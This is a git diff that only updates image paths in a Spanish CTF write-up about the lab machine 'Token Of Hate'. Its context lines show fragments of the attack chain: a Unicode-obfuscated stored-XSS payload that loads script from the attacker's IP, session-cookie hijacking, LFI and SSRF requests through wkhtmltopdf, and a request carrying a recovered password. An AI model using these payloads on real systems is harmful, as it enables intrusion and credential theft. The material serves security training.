@@ -5,7 +5,7 @@ title: WriteUp Token Of Hate - TheHackersLabs
 slug: token-of-hate-writeup-thehackerslabs-es
 featured: false
 draft: false
-ogImage: "assets/token-of-hate/OpenGraph.png"
+ogImage: "../../../assets/images/token-of-hate/OpenGraph.png"
 tags:
   - writeup
   - thehackerslabs
@@ -20,7 +20,7 @@ description:
   Resolución de un CTF de TheHackersLabs, con enumeración, explotación de XSS almacenado mediante Unicode, secuestro de cookies, ataques LFI y SSRF, manipulación de JWT para RCE y escalada de privilegios por medio de capabilities en Linux.
 lang: es
 ---
-![Rabbit Token Of Hate](/assets/token-of-hate/OpenGraph.png)
+![Rabbit Token Of Hate](../../../assets/images/token-of-hate/OpenGraph.png)
 
 Resolución de un CTF de TheHackersLabs, con enumeración, explotación de XSS almacenado mediante Unicode, secuestro de cookies, ataques LFI y SSRF, manipulación de JWT para RCE y escalada de privilegios por medio de capabilities en Linux.
 
@@ -28,7 +28,7 @@ Resolución de un CTF de TheHackersLabs, con enumeración, explotación de XSS a
 
 ## Enumeración
 
-![alt text](/assets/token-of-hate/image.png)
+![alt text](../../../assets/images/token-of-hate/image.png)
 
 Hacemos ping y observamos, por el TTL 64, que se trata de una máquina con sistema operativo `Linux`.
 
@@ -171,7 +171,7 @@ Finished
 
 Abrimos el sitio web que se ejecuta en el puerto 80 desde el navegador.
 
-![alt text](/assets/token-of-hate/image-1.png)
+![alt text](../../../assets/images/token-of-hate/image-1.png)
 
 Nos encontramos con un sitio web que, si lo observamos detenidamente, nos aporta varias pistas sobre cómo puede producirse la intrusión:
 
@@ -180,7 +180,7 @@ Nos encontramos con un sitio web que, si lo observamos detenidamente, nos aporta
 
 Además, vemos dos enlaces: uno a un formulario de registro, `Ir a Registro`.
 
-![alt text](/assets/token-of-hate/image-2.png)
+![alt text](../../../assets/images/token-of-hate/image-2.png)
 
 Con el siguiente código fuente:
 
@@ -228,7 +228,7 @@ Con el siguiente código fuente:
 
 El otro enlace muestra el formulario de inicio de sesión, `Ir a Login`.
 
-![alt text](/assets/token-of-hate/image-3.png)
+![alt text](../../../assets/images/token-of-hate/image-3.png)
 
 Con el siguiente código fuente:
 
@@ -274,7 +274,7 @@ Con el siguiente código fuente:
 
 Nos registramos con cualquier usuario y contraseña. Luego iniciamos sesión con esos mismos datos, encontrándonos con una página privada:
 
-![alt text](/assets/token-of-hate/image-4.png)
+![alt text](../../../assets/images/token-of-hate/image-4.png)
 
 Si revisamos el código fuente de esta página, hay algunas pistas adicionales en los comentarios.
 
@@ -311,7 +311,7 @@ Si revisamos el código fuente de esta página, hay algunas pistas adicionales e
 
 Observamos que la cookie del navegador, creada en nuestra sesión, no tiene activadas las flags `HttpOnly`, `Secure` ni `SameSite`.
 
-![alt text](/assets/token-of-hate/image-5.png)
+![alt text](../../../assets/images/token-of-hate/image-5.png)
 
 ## Intrusión
 
@@ -376,7 +376,7 @@ $ ./tranformar.sh '<script src="http://192.168.1.181/script.js"></script>'
 ＜script src=“http://192.168.1.181/script.js“＞＜/script＞
 ```
 
-![alt text](/assets/token-of-hate/image-6.png)
+![alt text](../../../assets/images/token-of-hate/image-6.png)
 
 Por otro lado, creamos un servicio web con Python en el puerto 80 y nos ponemos a la escucha. En poco tiempo recibimos la solicitud:
 
@@ -419,11 +419,11 @@ PHPSESSID=sd3q3eeg0v7cl3phim5r21iqah
 
 Iniciamos sesión en el navegador con el primer usuario de prueba que creamos (si fuera necesario, creamos otro desde el formulario de registro). Una vez logueados, desde las herramientas de desarrollador del navegador, en la pestaña `Storage > Cookies`, sustituimos el valor de la cookie de sesión `PHPSESSID` por el que nos llegó a través de nuestro servicio web y después actualizamos la página.
 
-![alt text](/assets/token-of-hate/image-7.png)
+![alt text](../../../assets/images/token-of-hate/image-7.png)
 
 Obtenemos acceso como usuario con rol de administrador en la aplicación web. A partir de ahí podemos ver todos los usuarios registrados, eliminarlos y descargar un documento PDF con su listado.
 
-![alt text](/assets/token-of-hate/image-8.png)
+![alt text](../../../assets/images/token-of-hate/image-8.png)
 
 ### Inclusión de fichero local (LFI)
 
@@ -435,7 +435,7 @@ Al generar el documento PDF, observamos que se envían peticiones a nuestro serv
 
 Descargamos el PDF con la lista de usuarios y lo analizamos.
 
-![alt text](/assets/token-of-hate/image-9.png)
+![alt text](../../../assets/images/token-of-hate/image-9.png)
 
 Con `exiftool` vemos que está generado con `wkhtmltopdf 0.12.6`, una herramienta muy usada para convertir `HTML` a `PDF`.
 
@@ -452,11 +452,11 @@ x.send();
 
 Descargamos el PDF y obtenemos el contenido de `/etc/passwd`.
 
-![alt text](/assets/token-of-hate/image-10.png)
+![alt text](../../../assets/images/token-of-hate/image-10.png)
 
 Podemos seguir extrayendo diferentes archivos del servidor, pero encontramos credenciales filtradas en el archivo `/var/www/html/index.php`.
 
-![alt text](/assets/token-of-hate/image-11.png)
+![alt text](../../../assets/images/token-of-hate/image-11.png)
 
 Las anotamos para tenerlas presentes:
 
@@ -515,7 +515,7 @@ x.send();
 
 Descargamos el PDF y vemos un texto en formato JSON:
 
-![alt text](/assets/token-of-hate/image-12.png)
+![alt text](../../../assets/images/token-of-hate/image-12.png)
 
 ```json
 {
@@ -595,7 +595,7 @@ users.forEach(async user => {
 
 Esperamos un momento y, al poco tiempo, recibimos todas las peticiones en nuestro servicio web. Fijándonos, los datos más extensos corresponden al usuario `Jose` (con la primera letra mayúscula y sin acento).
 
-![alt text](/assets/token-of-hate/image-13.png)
+![alt text](../../../assets/images/token-of-hate/image-13.png)
 
 Descodificamos la respuesta en base64 de la petición de inicio de sesión para el usuario `Jose`:
 
@@ -618,7 +618,7 @@ eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ikpvc2UiLCJyb2xlIjoidXNlciI
 
 Usamos http://jwt.io para decodificarlo.
 
-![alt text](/assets/token-of-hate/image-14.png)
+![alt text](../../../assets/images/token-of-hate/image-14.png)
 
 Observamos que el token usa el algoritmo `HS256` (parámetro `alg` del HEADER) y que su validez tras iniciar sesión es de 1 hora. Esto se ve en los campos `exp` (momento de expiración en UNIX timestamp) y `iat` (momento de emisión, también en UNIX timestamp) del payload.
 
@@ -706,7 +706,7 @@ petition1.send('{"username":"Jose","password":"FuLqqEAErWQsmTQQQhsb"}');
 
 Descargamos otro PDF y obtenemos la ejecución de comandos con el usuario `ctesias`.
 
-![alt text](/assets/token-of-hate/image-15.png)
+![alt text](../../../assets/images/token-of-hate/image-15.png)
 
 Modificamos la variable `command` de nuestro JavaScript en el archivo `script.js`, introduciendo la IP de nuestra máquina atacante:
 
@@ -727,7 +727,7 @@ ctesias@tokenofhate:/$
 
 Entramos en la máquina víctima como el usuario `ctesias`.
 
-![alt text](/assets/token-of-hate/image-16.png)
+![alt text](../../../assets/images/token-of-hate/image-16.png)
 
 Podemos leer la flag de `user.txt`:
 
@@ -764,7 +764,7 @@ v18.19.0
 
 Buscamos en `gtfobins` una forma de escalar con un binario `node` que tenga capabilities y la encontramos.
 
-![alt text](/assets/token-of-hate/image-17.png)
+![alt text](../../../assets/images/token-of-hate/image-17.png)
 
 Ejecutamos el siguiente comando para conseguir privilegios de root:
 
